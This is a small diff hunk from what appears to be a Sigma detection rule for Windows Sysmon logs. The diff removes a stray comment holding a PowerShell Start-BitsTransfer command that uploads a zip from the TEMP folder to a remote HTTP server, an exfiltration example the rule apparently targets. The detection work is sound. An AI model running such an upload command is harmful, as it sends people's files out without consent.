@@ -46,7 +46,7 @@ tags:
 date: 2022/05/12
 author: CyberCastle [Assem Morad]
 id: aa41099c-fe2c-4d3f-9d16-97d07c2935e
-logsource:          #Start-BitsTransfer -TransferType Upload -Source "$env:TEMP/Part1.zip" -Destination "http://192.168.44.128/test/Part1.zip"
+logsource:       
     product: windows
     service: sysmon
     definition:
